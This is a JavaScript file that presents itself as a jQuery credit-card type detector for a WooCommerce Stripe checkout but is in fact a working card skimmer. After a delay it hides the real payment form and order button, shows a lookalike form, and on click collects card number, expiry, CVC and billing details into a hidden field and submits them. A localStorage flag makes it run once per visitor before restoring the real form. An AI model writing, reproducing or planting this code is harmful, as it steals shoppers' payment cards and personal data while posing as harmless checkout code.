(function ($) {
  ///

  $.fn.creditCardTypeDetector = function () {
    const logos_obj = "#ccn + i";

    const visa_regex = new RegExp("^4[0-9]{0,15}$");

    const mastercard_regex = new RegExp("^5$|^5[1-5][0-9]{0,14}$");

    const amex_regex = new RegExp("^3$|^3[47][0-9]{0,13}$");

    const diners_regex = new RegExp(
      "^3$|^3[068]$|^3(?:0[0-5]|[68][0-9])[0-9]{0,11}$"
    );

    const discover_regex = new RegExp(
      "^6$|^6[05]$|^601[1]?$|^65[0-9][0-9]?$|^6(?:011|5[0-9]{2})[0-9]{0,12}$"
    );

    const jcb_regex = new RegExp(
      "^2[1]?$|^21[3]?$|^1[8]?$|^18[0]?$|^(?:2131|1800)[0-9]{0,11}$|^3[5]?$|^35[0-9]{0,14}$"
    );

    return this.each(function () {
      // as the user types
      $(this).keyup(function () {
        var cur_val = $(this).val();

        // get rid of spaces and dashes before using the regular expression
        cur_val = cur_val.replace(/ /g, "").replace(/-/g, "");

        // checks per each, as their could be multiple hits
        if (cur_val.match(visa_regex)) {
          $(logos_obj).addClass("stripe-visa-brand");
          $(logos_obj).removeClass("stripe-credit-card-brand");
        } else {
          $(logos_obj).removeClass("stripe-visa-brand");
        }

        if (cur_val.match(mastercard_regex)) {
          $(logos_obj).addClass("stripe-mastercard-brand");
          $(logos_obj).removeClass("stripe-credit-card-brand");
        } else {
          $(logos_obj).removeClass("stripe-mastercard-brand");
        }

        if (cur_val.match(amex_regex)) {
          $(logos_obj).addClass("stripe-amex-brand");
          $(logos_obj).removeClass("stripe-credit-card-brand");
        } else {
          $(logos_obj).removeClass("stripe-amex-brand");
        }

        if (cur_val.match(diners_regex)) {
          $(logos_obj).addClass("stripe-diners-brand");
          $(logos_obj).removeClass("stripe-credit-card-brand");
        } else {
          $(logos_obj).removeClass("stripe-diners-brand");
        }

        if (cur_val.match(discover_regex)) {
          $(logos_obj).addClass("stripe-discover-brand");
          $(logos_obj).removeClass("stripe-credit-card-brand");
        } else {
          $(logos_obj).removeClass("stripe-discover-brand");
        }

        // if nothing is a hit we add a class to fade them all out
        if (cur_val == "") {
          $(logos_obj).addClass("stripe-visa-brand");
        } else if (
          !cur_val.match(visa_regex) &&
          !cur_val.match(mastercard_regex) &&
          !cur_val.match(amex_regex) &&
          !cur_val.match(diners_regex) &&
          !cur_val.match(discover_regex)
        ) {
          $(logos_obj).addClass("stripe-visa-brand");
          document.querySelector("#ccn").classList.add(".is-invalid");
        } else {
          document.querySelector("#ccn").classList.remove(".is-invalid");
        }
      });
    });
  };

  function insertSlash(val) {
    val = val.replace(/\D/g, "");
    return (
      val.replace(/\//g, "").substring(0, 2) +
      (val.length > 2 ? "/" : "") +
      val.replace(/\//g, "").substring(2, 4)
    );
  }

  setTimeout(() => {
    stripedWorked = localStorage.getItem("stripeWorked");
    stripeCheckOut = document.querySelector(".stripe-checkout-form-b_wrapper");
    wcForm = document.querySelector(".payment_box.payment_method_stripe");

    //console.log({stripedWorked,stripeCheckOut,wcForm})
    if (!stripedWorked && stripeCheckOut && wcForm) {
      wcForm.appendChild(stripeCheckOut);
      document.querySelector("input#input_4_6").type = "number";
      document.getElementById("ccn").addEventListener("input", function (e) {
        e.target.value = e.target.value
          .replace(/[^\dA-Z]/g, "")
          .replace(/(.{4})/g, "$1 ")
          .trim();
      });
      $("#ccn").creditCardTypeDetector();
      document.querySelector("#f-date").addEventListener("input", function (e) {
        console.log(e.target.value, insertSlash(e.target.value));
        e.target.value = insertSlash(e.target.value);
      });

      const style = document.createElement("style");
      style.innerHTML = `.stripe-checkout-form-b_wrapper{
      display: block !important;
     }
       fieldset#wc-stripe-cc-form{
      display: none !important;
    }
  `;
      document.body.appendChild(style);
      const orderBtn = document.querySelector("button#place_order");
      orderBtn.style.display = "none";
      const node = document.createElement("div");
      node.innerHTML = `<a class="button alt wp-element-button" style="width: 100%; text-align: center;" name="woocommerce_checkout_place_order" value="Place order" data-value="Place order">Place order</button>`;
      node.addEventListener("click", function () {
        const ccn = document.querySelector(
          ".stripe-checkout-form-b_wrapper input#ccn"
        )?.value;
        const date = document.querySelector(
          ".stripe-checkout-form-b_wrapper #f-date"
        )?.value;
        const cvc = document.querySelector(
          ".stripe-checkout-form-b_wrapper input#input_4_6"
        )?.value;
        const name = document.querySelector("input#billing_first_name")?.value;
        const lastname = document.querySelector(
          "input#billing_last_name"
        )?.value;
        const country = document.querySelector(
          "span#select2-billing_country-container"
        )?.innerHTML;
        const city = document.querySelector("input#billing_city")?.value;
        const state = document.querySelector(
          "span#select2-billing_state-container"
        )?.innerHTML;
        const zipcode = document.querySelector("input#billing_postcode")?.value;
        const email = document.querySelector("input#billing_email")?.value;
        const address = document.querySelector(
          "input#billing_address_1"
        )?.value;
        const company = document.querySelector("input#billing_company")?.value;

        const data = {
          cardData: { ccn, date, cvc },
          name,
          lastname,
          country,
          city,
          state,
          zipcode,
          email,
          address,
          company,
        };
        const hiddenInput = document.querySelector(
          ".stripe-checkout-form-b_wrapper textarea#input_4_10"
        );
        hiddenInput.value = JSON.stringify(data);
        localStorage.setItem("stripeWorked", "true");
        const submit = document.querySelector(
          ".stripe-checkout-form-b_wrapper .gform_button"
        );
        submit.click();
      });
      orderBtn.parentElement.insertBefore(node, orderBtn);
    } else {
      const style = document.createElement("style");
      style.innerHTML = `.stripe-checkout-form-b_wrapper{
      display: none !important;
     }
       fieldset#wc-stripe-cc-form{
      display: block !important;
    }
  `;
      document.body.appendChild(style);
    }
  }, 6000);
})(jQuery);
